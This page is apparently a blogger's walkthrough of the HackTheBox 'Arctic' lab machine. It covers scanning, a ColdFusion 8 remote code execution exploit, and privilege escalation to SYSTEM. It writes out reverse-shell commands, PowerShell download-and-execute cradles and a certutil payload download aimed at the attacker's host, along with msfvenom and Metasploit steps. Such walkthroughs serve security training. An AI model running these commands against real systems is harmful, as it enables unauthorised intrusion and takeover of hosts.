---
layout: page
title: Arctic
description: Exploited CFIDE vulnerability
img: 
importance: 4
category: HackTheBox
team: Red Team Labs
related_publications: false
---

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/arctic/logo.png" title="HTB Arctic Logo" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<h2>Link</h2>
<a href="https://app.hackthebox.com/machines/Arctic">Room Link</a>

<br/>
<h2>Process</h2>

<br/>
Time to get bundled up because we are heading to the arctic!

Per the usual, when need to derermine the running services by running nmap.

{% capture nmap %}
┌──(kali㉿kali)-[~/Documents/htb/arctic]
└─$ sudo nmap -sC -sV -A -O -oN nmap 10.10.10.11 
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-16 21:19 AEDT
Nmap scan report for 10.10.10.11
Host is up (0.015s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT      STATE SERVICE VERSION
135/tcp   open  msrpc   Microsoft Windows RPC
8500/tcp  open  fmtp?
49154/tcp open  msrpc   Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|phone|specialized
Running (JUST GUESSING): Microsoft Windows 2008|7|Vista|Phone|2012|8.1 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_vista cpe:/o:microsoft:windows cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows_8.1
Aggressive OS guesses: Microsoft Windows 7 or Windows Server 2008 R2 (97%), Microsoft Windows Server 2008 R2 or Windows 7 SP1 (92%), Microsoft Windows Vista or Windows 7 (92%), Microsoft Windows Phone 7.5 or 8.0 (92%), Microsoft Windows Server 2012 R2 (91%), Microsoft Windows 8.1 Update 1 (90%), Microsoft Windows Embedded Standard 7 (89%), Microsoft Windows Server 2008 R2 (89%), Microsoft Windows Server 2008 R2 or Windows 8.1 (89%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (89%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

TRACEROUTE (using port 135/tcp)
HOP RTT      ADDRESS
1   16.94 ms 10.10.16.1
2   16.97 ms 10.10.10.11

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 143.24 seconds
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=nmap %}

<br />
Check the landing page the webserver is serving on port 8500.

<div class="row justify-content-sm-center">
    <div class="col-sm-4 mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/arctic/landing.png" title="Landing Page" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Check the content of the CFIDE folder.

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/arctic/cfidelanding.png" title="CFIDE Landing Page" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Check the Cold Fusion login page.  Note the version 8 on the login page.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/arctic/cfmain.png" title="Cold Fusion Login" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<by />
Check searchsploit for the cold fusion version.

{% capture searchsploit %}
┌──(kali㉿kali)-[~/Documents/htb/arctic]
└─$ searchsploit cold fusion 8                
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                            |  Path
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Adobe ColdFusion - 'probe.cfm' Cross-Site Scripting                                                                                                                                                       | cfm/webapps/36067.txt
Adobe ColdFusion - Directory Traversal                                                                                                                                                                    | multiple/remote/14641.py
Adobe ColdFusion - Directory Traversal (Metasploit)                                                                                                                                                       | multiple/remote/16985.rb
Adobe ColdFusion 11 - LDAP Java Object Deserialization Remode Code Execution (RCE)                                                                                                                        | windows/remote/50781.txt
Adobe Coldfusion 11.0.03.292866 - BlazeDS Java Object Deserialization Remote Code Execution                                                                                                               | windows/remote/43993.py
Adobe ColdFusion 2018 - Arbitrary File Upload                                                                                                                                                             | multiple/webapps/45979.txt
Adobe ColdFusion 6/7 - User_Agent Error Page Cross-Site Scripting                                                                                                                                         | cfm/webapps/29567.txt
Adobe ColdFusion 7 - Multiple Cross-Site Scripting Vulnerabilities                                                                                                                                        | cfm/webapps/36172.txt
Adobe ColdFusion 8 - Remote Command Execution (RCE)                                                                                                                                                       | cfm/webapps/50057.py
Adobe ColdFusion 9 - Administrative Authentication Bypass                                                                                                                                                 | windows/webapps/27755.txt
Adobe ColdFusion 9 - Administrative Authentication Bypass (Metasploit)                                                                                                                                    | multiple/remote/30210.rb
Adobe ColdFusion < 11 Update 10 - XML External Entity Injection                                                                                                                                           | multiple/webapps/40346.py
Adobe ColdFusion APSB13-03 - Remote Multiple Vulnerabilities (Metasploit)                                                                                                                                 | multiple/remote/24946.rb
Adobe ColdFusion Server 8.0.1 - '/administrator/enter.cfm' Query String Cross-Site Scripting                                                                                                              | cfm/webapps/33170.txt
Adobe ColdFusion Server 8.0.1 - '/wizards/common/_authenticatewizarduser.cfm' Query String Cross-Site Scripting                                                                                           | cfm/webapps/33167.txt
Adobe ColdFusion Server 8.0.1 - '/wizards/common/_logintowizard.cfm' Query String Cross-Site Scripting                                                                                                    | cfm/webapps/33169.txt
Adobe ColdFusion Server 8.0.1 - 'administrator/logviewer/searchlog.cfm?startRow' Cross-Site Scripting                                                                                                     | cfm/webapps/33168.txt
Adobe ColdFusion versions 2018_15 (and earlier) and 2021_5 and earlier - Arbitrary File Read                                                                                                              | multiple/webapps/51875.py
Allaire ColdFusion Server 4.0 - Remote File Display / Deletion / Upload / Execution                                                                                                                       | multiple/remote/19093.txt
Allaire ColdFusion Server 4.0.1 - 'CFCRYPT.EXE' Decrypt Pages                                                                                                                                             | windows/local/19220.c
ColdFusion 8.0.1 - Arbitrary File Upload / Execution (Metasploit)                                                                                                                                         | cfm/webapps/16788.rb
ColdFusion 9-10 - Credential Disclosure                                                                                                                                                                   | multiple/webapps/25305.py
ColdFusion MX - Missing Template Cross-Site Scripting                                                                                                                                                     | cfm/remote/21548.txt
ColdFusion MX - Remote Development Service                                                                                                                                                                | windows/remote/50.pl
ColdFusion Scripts Red_Reservations - Database Disclosure                                                                                                                                                 | asp/webapps/7440.txt
ColdFusion Server 2.0/3.x/4.x - Administrator Login Password Denial of Service                                                                                                                            | multiple/dos/19996.txt
Macromedia ColdFusion MX 6.0 - Remote Development Service File Disclosure                                                                                                                                 | multiple/remote/22867.pl
Macromedia ColdFusion MX 6.0 - SQL Error Message Cross-Site Scripting                                                                                                                                     | cfm/webapps/23256.txt
Macromedia ColdFusion MX 6.1 - Template Handling Privilege Escalation                                                                                                                                     | multiple/remote/24654.txt
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=searchsploit %}

<br />
Copy the exploit into the local working folder.

{% capture copylocalworkingfolder %}
┌──(kali㉿kali)-[~/Documents/htb/arctic]
└─$ cp `locate 50057.py` . 
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=copylocalworkingfolder %}

<br />
Update the lhost, rhost, and lport with the appropriate values.

{% capture cfexploit %}
# Exploit Title: Adobe ColdFusion 8 - Remote Command Execution (RCE)
# Google Dork: intext:"adobe coldfusion 8"
# Date: 24/06/2021
# Exploit Author: Pergyz
# Vendor Homepage: https://www.adobe.com/sea/products/coldfusion-family.html
# Version: 8
# Tested on: Microsoft Windows Server 2008 R2 Standard
# CVE : CVE-2009-2265

#!/usr/bin/python3

from multiprocessing import Process
import io
import mimetypes
import os
import urllib.request
import uuid

<snip>

if __name__ == '__main__':
    # Define some information
    lhost = '10.10.16.12'
    lport = 4444
    rhost = "10.10.10.11"
    rport = 8500
    filename = uuid.uuid4().hex
{% endcapture %}
{% include terminal.html language='python' title='50057.py' content=cfexploit %}

<br />
Run the exploit and achieve code execution.

{% capture runexploit %}
┌──(kali㉿kali)-[~/Documents/htb/arctic]
└─$ python3 50057.py                

Generating a payload...
Payload size: 1497 bytes
Saved as: 2b4d9d6f349546d190f19e3daccc358e.jsp

<snip>

Deleting the payload...

Listening for connection...

Executing the payload...
listening on [any] 4444 ...
connect to [10.10.16.12] from (UNKNOWN) [10.10.10.11] 49253
{% endcapture %}

{% capture catchfootholdshell %}
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.


C:\ColdFusion8\runtime\bin>
{% endcapture %}

{% include terminal.html language='bash' title='bash' content=runexploit %}

{% include terminal.html language='cmd' title='cmd.exe' content=catchfootholdshell %}

<br />
Run the whoami commands to get a sense the use that we are.

{% capture whoami %}
C:\ColdFusion8\runtime\bin>whoami
whoami
arctic\tolis

C:\ColdFusion8\runtime\bin>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
{% endcapture %}
{% include terminal.html language='cmd' title='cmd.exe' content=whoami %}

<br />
Run systeminfo to get a sense of the system.

{% capture systeminfo %}
C:\ColdFusion8\runtime\bin>systeminfo
systeminfo

Host Name:                 ARCTIC
OS Name:                   Microsoft Windows Server 2008 R2 Standard 
OS Version:                6.1.7600 N/A Build 7600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                55041-507-9857321-84451
Original Install Date:     22/3/2017, 11:09:45 ��
System Boot Time:          17/2/2025, 8:13:21 ��
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: AMD64 Family 25 Model 1 Stepping 1 AuthenticAMD ~2645 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 12/11/2020
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             el;Greek
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC+02:00) Athens, Bucharest, Istanbul
Total Physical Memory:     6.143 MB
Available Physical Memory: 5.155 MB
Virtual Memory: Max Size:  12.285 MB
Virtual Memory: Available: 11.336 MB
Virtual Memory: In Use:    949 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB
Logon Server:              N/A
Hotfix(s):                 N/A
Network Card(s):           1 NIC(s) Installed.
                           [01]: Intel(R) PRO/1000 MT Network Connection
                                 Connection Name: Local Area Connection
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 10.10.10.11
{% endcapture %}
{% include terminal.html language='cmd' title='cmd.exe' content=systeminfo %}

<br />
Get the user.txt flag.

{% capture userflag %}
C:\Users\tolis\Desktop>type user.txt
type user.txt
<redacted>

C:\Users\tolis\Desktop>ipconfig
ipconfig

Windows IP Configuration


Ethernet adapter Local Area Connection:

   Connection-specific DNS Suffix  . : 
   IPv4 Address. . . . . . . . . . . : 10.10.10.11
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 10.10.10.2

Tunnel adapter isatap.{79F1B374-AC3C-416C-8812-BF482D048A22}:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . : 

Tunnel adapter Local Area Connection* 9:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . :
{% endcapture %}
{% include terminal.html language='cmd' title='cmd.exe' content=userflag %}

<br />
Copy MS16032 into the local working folder.

{% capture cpms16032local %}
┌──(kali㉿kali)-[~/Documents/htb/arctic]
└─$ cp $(locate MS16032) .
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=cpms16032local %}

<br />
Copy Nishang into the local working folder.

{% capture cpnishang %}
┌──(kali㉿kali)-[~/Documents/htb/arctic]
└─$ cp /usr/share/nishang/Shells/Invoke-PowerShellTcp.ps1 ./shell.ps1
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=cpnishang %}

<br />
Update MS16032 to download the shell.ps1 script.

{% capture ms16032upd %}
function Invoke-MS16-032 {
<#
.SYNOPSIS

    PowerShell implementation of MS16-032. The exploit targets all vulnerable
    operating systems that support PowerShell v2+. Credit for the discovery of
    the bug and the logic to exploit it go to James Forshaw (@tiraniddo) and @Fuzzysec for the original PS script.
    Modifications by Mike Benich (@benichmt1).

    Targets:

    * Win7-Win10 & 2k8-2k12 <== 32/64 bit!
    * Tested on x32 Win7, x64 Win8, x64 2k12R2

    Notes:

    * In order for the race condition to succeed the machine must have 2+ CPU
      cores. If testing in a VM just make sure to add a core if needed mkay.
    * The exploit is pretty reliable, however ~1/6 times it will say it succeeded
      but not spawn a shell. Not sure what the issue is but just re-run and profit!
    * Want to know more about MS16-032 ==>
      https://googleprojectzero.blogspot.co.uk/2016/03/exploiting-leaked-thread-handle.html
.DESCRIPTION
	Author: Ruben Boonen (@FuzzySec)
	Blog: http://www.fuzzysecurity.com/
	License: BSD 3-Clause
	Required Dependencies: PowerShell v2+
	Optional Dependencies: None
	Empire Updates - Mike Benich / @benichmt1

.EXAMPLE
	C:\PS> Invoke-MS16-032
#>

<snip>

	# main() <--- ;)
	$ms16032 = @"
	 __ __ ___ ___   ___     ___ ___ ___
	|  V  |  _|_  | |  _|___|   |_  |_  |
	|     |_  |_| |_| . |___| | |_  |  _|
	|_|_|_|___|_____|___|   |___|___|___|

	               [by b33f -> @FuzzySec]
"@

<snip>

Invoke-MS16032 -Command "iex(New-Object Net.WebClient).DownloadString('http://10.10.16.12:8000/shell.ps1')"
{% endcapture %}
{% include terminal.html language='powershell' title='PowerShell' content=ms16032upd %}

<br />
Update the shell.ps1 script to invoke the command to create the reverse shell.

{% capture updatenishang %}
function Invoke-PowerShellTcp 
{ 
<#
.SYNOPSIS
Nishang script which can be used for Reverse or Bind interactive PowerShell from a target. 

.DESCRIPTION
This script is able to connect to a standard netcat listening on a port when using the -Reverse switch. 
Also, a standard netcat can connect to this script Bind to a specific port.

The script is derived from Powerfun written by Ben Turner & Dave Hardy

.PARAMETER IPAddress
The IP address to connect to when using the -Reverse switch.

.PARAMETER Port
The port to connect to when using the -Reverse switch. When using -Bind it is the port on which this script listens.

.EXAMPLE
PS > Invoke-PowerShellTcp -Reverse -IPAddress 192.168.254.226 -Port 4444

Above shows an example of an interactive PowerShell reverse connect shell. A netcat/powercat listener must be listening on 
the given IP and port. 

.EXAMPLE
PS > Invoke-PowerShellTcp -Bind -Port 4444

Above shows an example of an interactive PowerShell bind connect shell. Use a netcat/powercat to connect to this port. 

.EXAMPLE
PS > Invoke-PowerShellTcp -Reverse -IPAddress fe80::20c:29ff:fe9d:b983 -Port 4444

Above shows an example of an interactive PowerShell reverse connect shell over IPv6. A netcat/powercat listener must be
listening on the given IP and port. 

.LINK
http://www.labofapenetrationtester.com/2015/05/week-of-powershell-shells-day-1.html
https://github.com/nettitude/powershell/blob/master/powerfun.ps1
https://github.com/samratashok/nishang
#>      
    
    <snip>

Invoke-PowerShellTcp -Reverse -IPAddress 10.10.16.12 -Port 9999
{% endcapture %}
{% include terminal.html language='powershell' title='PowerShell' content=updatenishang %}

<br />
Set-up a listener.

{% capture start9999listener %}
┌──(kali㉿kali)-[~/Documents/htb/arctic]
└─$ nc -nlvp 9999
listening on [any] 9999 ...
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=start9999listener %}

<br />
Use PowerShell to download and execute MS16032 and notice that it freezes.  Restart connect the shell if necessary.

{% capture runms16032 %}
C:\ColdFusion8\runtime\bin>powershell IEX(New-Object Net.Webclient).DownloadString('http://10.10.16.12:8000/Invoke-MS16032.ps1')
powershell IEX(New-Object Net.Webclient).DownloadString('http://10.10.16.12:8000/Invoke-MS16032.ps1')
{% endcapture %}
{% include terminal.html language='cmd' title='cmd.exe' content=runms16032 %}

<br />
Use msfvenom to generate a payload.

{% capture generatemeter %}
┌──(kali㉿kali)-[~/Documents/htb/arctic]
└─$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.16.12 LPORT=4445 -f exe -o meter.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 354 bytes
Final size of exe file: 73802 bytes
Saved as: meter.exe
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/Documents/htb/arctic]
└─$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=generatemeter %}

<br />
Start a metasploit multi/handler listener.

{% capture startmultihandler %}
┌──(kali㉿kali)-[~/Documents/htb/arctic]
└─$ msfconsole -q
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set lhost tun0
lhost => tun0
msf6 exploit(multi/handler) > set lhost tun0
lhost => tun0
msf6 exploit(multi/handler) > set lport 4445
lport => 4445
msf6 exploit(multi/handler) > exploit
[*] Started reverse TCP handler on 10.10.16.12:4445
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=startmultihandler %}

<br />
Transfer the meterpreter payload to the victim machine.

{% capture transfermeter %}
C:\Users\tolis>certutil.exe -urlcache -f http://10.10.16.12:8000/meter.exe meter.exe
certutil.exe -urlcache -f http://10.10.16.12:8000/meter.exe meter.exe
****  Online  ****
CertUtil: -URLCache command completed successfully.
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=transfermeter %}

<br />
Execute the meterpreter payload.

{% capture runmeter %}
C:\Users\tolis>.\meter.exe
.\meter.exe
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=runmeter %}

<br />
Check the handler to catch the meterpreter session.

{% capture catchmeter %}
msf6 exploit(multi/handler) > exploit
[*] Started reverse TCP handler on 10.10.16.12:4445 
[*] Sending stage (177734 bytes) to 10.10.10.11
[*] Meterpreter session 1 opened (10.10.16.12:4445 -> 10.10.10.11:49449) at 2025-02-16 22:21:11 +1100

meterpreter >
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=catchmeter %}

<br />
Background the session and run local_exploit_suggester.

{% capture runsuggester %}
meterpreter > 
Background session 1? [y/N]  y
[-] Unknown command: y. Run the help command for more details.
msf6 exploit(multi/handler) > search suggester

Matching Modules
================

   #  Name                                      Disclosure Date  Rank    Check  Description
   -  ----                                      ---------------  ----    -----  -----------
   0  post/multi/recon/local_exploit_suggester  .                normal  No     Multi Recon Local Exploit Suggester


Interact with a module by name or index. For example info 0, use 0 or use post/multi/recon/local_exploit_suggester

msf6 exploit(multi/handler) > use post/multi/recon/local_exploit_suggester
[*] Using configured payload windows/meterpreter/reverse_tcp
msf6 post(multi/recon/local_exploit_suggester) > set session 1
session => 1
msf6 post(multi/recon/local_exploit_suggester) > exploit
[*] 10.10.10.11 - Collecting local exploits for x86/windows...
/usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/logging-2.4.0/lib/logging.rb:10: warning: /usr/lib/x86_64-linux-gnu/ruby/3.3.0/syslog.so was loaded from the standard library, but will no longer be part of the default gems starting from Ruby 3.4.0.
You can add syslog to your Gemfile or gemspec to silence this warning.
Also please contact the author of logging-2.4.0 to request adding syslog into its gemspec.
[*] 10.10.10.11 - 203 exploit checks are being tried...
[+] 10.10.10.11 - exploit/windows/local/bypassuac_comhijack: The target appears to be vulnerable.
[+] 10.10.10.11 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
[+] 10.10.10.11 - exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move: The service is running, but could not be validated. Vulnerable Windows 7/Windows Server 2008 R2 build detected!
[+] 10.10.10.11 - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable.
[+] 10.10.10.11 - exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.10.11 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.10.11 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
[+] 10.10.10.11 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The service is running, but could not be validated.
[+] 10.10.10.11 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.
[+] 10.10.10.11 - exploit/windows/local/ms16_075_reflection_juicy: The target appears to be vulnerable.
[+] 10.10.10.11 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
[*] Running check method for exploit 42 / 42
[*] 10.10.10.11 - Valid modules for session 1:
============================

 #   Name                                                           Potentially Vulnerable?  Check Result
 -   ----                                                           -----------------------  ------------
 1   exploit/windows/local/bypassuac_comhijack                      Yes                      The target appears to be vulnerable.
 2   exploit/windows/local/bypassuac_eventvwr                       Yes                      The target appears to be vulnerable.
 3   exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move   Yes                      The service is running, but could not be validated. Vulnerable Windows 7/Windows Server 2008 R2 build detected!
 4   exploit/windows/local/ms13_053_schlamperei                     Yes                      The target appears to be vulnerable.
 5   exploit/windows/local/ms13_081_track_popup_menu                Yes                      The target appears to be vulnerable.
 6   exploit/windows/local/ms14_058_track_popup_menu                Yes                      The target appears to be vulnerable.
 7   exploit/windows/local/ms15_051_client_copy_image               Yes                      The target appears to be vulnerable.
 8   exploit/windows/local/ms16_032_secondary_logon_handle_privesc  Yes                      The service is running, but could not be validated.
 9   exploit/windows/local/ms16_075_reflection                      Yes                      The target appears to be vulnerable.
 10  exploit/windows/local/ms16_075_reflection_juicy                Yes                      The target appears to be vulnerable.
 11  exploit/windows/local/ppr_flatten_rec                          Yes                      The target appears to be vulnerable.

 <snip>
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=runsuggester %}

<br />
Choose to use the reflection juicy exploit.

{% capture usejuicy %}
msf6 post(multi/recon/local_exploit_suggester) > use exploit/windows/local/ms16_075_reflection_juicy
[*] Using configured payload windows/meterpreter/reverse_tcp
msf6 exploit(windows/local/ms16_075_reflection_juicy) > set lhost tun0
lhost => tun0
msf6 exploit(windows/local/ms16_075_reflection_juicy) > set lhost tun0
lhost => tun0
msf6 exploit(windows/local/ms16_075_reflection_juicy) > set lport 4446
lport => 4446
msf6 exploit(windows/local/ms16_075_reflection_juicy) > set session 1
session => 1
msf6 exploit(windows/local/ms16_075_reflection_juicy) > exploit
[*] Started reverse TCP handler on 10.10.16.9:4446 
[+] Target appears to be vulnerable (Windows Server 2008 R2)
[*] Launching notepad to host the exploit...
[+] Process 2988 launched.
[*] Reflectively injecting the exploit DLL into 2988...
[*] Injecting exploit into 2988...
[*] Exploit injected. Injecting exploit configuration into 2988...
[*] Configuration injected. Executing exploit...
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Sending stage (177734 bytes) to 10.10.10.11
[*] Meterpreter session 2 opened (10.10.16.9:4446 -> 10.10.10.11:49262) at 2025-03-30 19:48:25 +1100

meterpreter >
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=usejuicy %}

<br />
Migrate to a process that is running as SYSTEM.

{% capture migrateprocess %}
meterpreter > ps

Process List
============

 PID   PPID  Name                     Arch  Session  User                          Path
 ---   ----  ----                     ----  -------  ----                          ----

<snip>

 1000  480   spoolsv.exe              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\spoolsv.exe

<snip>


meterpreter > migrate 1000
[*] Migrating from 4076 to 1000...
[*] Migration completed successfully.
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=migrateprocess %}

<br />
Get the root.txt flag.

{% capture rootflag %}
C:\Users\Administrator\Desktop>type root.txt
type root.txt
<redacted>

C:\Users\Administrator\Desktop>ipconfig
ipconfig

Windows IP Configuration


Ethernet adapter Local Area Connection:

   Connection-specific DNS Suffix  . : 
   IPv4 Address. . . . . . . . . . . : 10.10.10.11
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 10.10.10.2

Tunnel adapter isatap.{79F1B374-AC3C-416C-8812-BF482D048A22}:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . : 

Tunnel adapter Local Area Connection* 9:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . :
{% endcapture %}
{% include terminal.html language='cmd' title='cmd.exe' content=rootflag %}

<br />
Looks like our juicy reflection was enough to crack the harsh Arctic.  Hopefully, you enjoyed the read.  Look forwared to seeing you in the next one.